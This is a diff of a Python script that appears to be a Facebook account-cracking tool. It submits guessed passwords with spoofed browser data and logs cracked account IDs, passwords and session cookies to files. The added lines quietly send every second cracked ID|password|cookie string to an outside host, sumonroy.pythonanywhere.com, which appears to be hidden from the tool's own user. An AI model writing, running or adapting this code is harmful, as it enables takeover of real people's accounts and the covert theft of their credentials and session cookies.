@@ -1339,7 +1339,7 @@ def p(uid,pwx,tl):
             'lgnrnd': '082322_j4iS',
             'lgnjs': '1743866603',
             'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc0Mzg2NjYwMy4wNjIsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc0Mzg2NjYwMy4wNjMsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzQzODY2NjAzLjA2MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NDM4NjY2MDMuMDY0LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6WyJlbi1JTiIsImVuLVVTIiwiZW4tR0IiLCJlbiIsImhpIiwiZ3UiLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzQzODY2NjAzLjA2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc0Mzg2NjYwMy4wNjQsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp7InciOjE0NDAsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NDM4NjY2MDMuMDY3LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzQzODY2NjAzLjE3OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzQzODY2NjAzLjA2OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3NDM4NjY2MDMuMDY4LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM1LjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzQzODY2NjAzLjA2OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJXaW4zMiJ9XSwiMzAwMTgiOlt7InQiOjE3NDM4NjY2MDMuMDY5LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc0Mzg2NjYwMy4wODIsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzQzODY2NjAzLjA4MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3NDM4NjY2MDMuMDgzLCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MH1dLCIzMDA5NCI6W3sidCI6MTc0Mzg2NjYwMy4wODMsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDA5NSI6W3sidCI6MTc0Mzg2NjYwMy4wODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijo5fV0sIjMwMTA2IjpbeyJ0IjoxNzQzODY2NjAzLjA1MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfSx7InQiOjE3NDM4NjY2MDMuMDU5LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX0seyJ0IjoxNzQzODY2NjAzLjA5OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfSx7InQiOjE3NDM4NjY2MDMuMTY3LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDEwNyI6W3sidCI6MTc0Mzg2NjYwMy4wNTIsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX1dfQ==',
-            'email': '61569401195472',
+            'email': uid,
             'prefill_contact_point': '',
             'prefill_source': 'browser_dropdown',
             'prefill_type': 'password',
@@ -1348,7 +1348,7 @@ def p(uid,pwx,tl):
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'true',
             'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM/yAAAAAAFAA',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], '983897'),}
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': 'ES-iZxg35DqKN--TlZlh4Mwu',
             'sb': 'ES-iZ0S0Q3TXxuSylCRJGHa3',
@@ -1390,33 +1390,24 @@ def p(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if not response.get("is_account_confirmed", True):
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/ATOM-ALL-FILE/ATOM-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
+                    bkas.append(cid)
+                    if len(bkas)% 2 == 0:
+                       statusok = (f"{cid}|{pw}|{coki}")
+                       requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-ALL-FILE/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                       print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                       print(f" {green}Cookie : {green}{coki}")
+                       open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                       oks.append(cid)
+                       break
                 else:
                     break
-            elif "checkpoint" in response:
-                 #print(f"[GENERAL CHECKPOINT] {uid}|{pw}")
-                 open("/sdcard/ATOM-ALL-FILE/ATOM-CP.txt", "a").write(f"{uid}|{pw}\n")
-                 cps.append(uid)
-                 break
-            elif "confirm your identity on another device" in po.lower() or "log in from a device" in po.lower():
-                 print(f"[device cnfrm cp] {uid}|{pw}")
-                 open("/sdcard/ATOM-ALL-FILE/DEVICE-CHECKPOINT.txt", "a").write(f"{uid}|{pw}\n")
-                 cps.append(uid)
-                 break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
             else:
                 continue
         loop+=1
